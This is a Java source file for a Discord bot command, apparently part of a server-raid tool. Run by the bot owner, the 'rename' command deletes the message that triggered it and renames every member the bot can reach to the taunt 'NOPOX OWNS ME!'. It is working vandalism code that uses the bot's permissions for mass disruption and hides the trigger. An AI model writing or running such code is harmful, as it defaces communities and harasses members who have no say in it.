package com.visions.dev.Commands;

import com.jagrosh.jdautilities.command.Command;
import com.jagrosh.jdautilities.command.CommandEvent;
import lombok.SneakyThrows;

import java.util.concurrent.TimeUnit;

public class RenameAllCommand extends Command {

    public RenameAllCommand() {
        this.name = "rename";
        this.ownerCommand = true;
        this.guildOnly = false;
    }

    @SneakyThrows
    protected void execute(CommandEvent event) {

        event.getMessage().delete().queue();

        event.getGuild().loadMembers(member -> {
            if (event.getGuild().getSelfMember().canInteract(member)) {
                member.modifyNickname("NOPOX OWNS ME!").queue();

            }
        });

    }
}
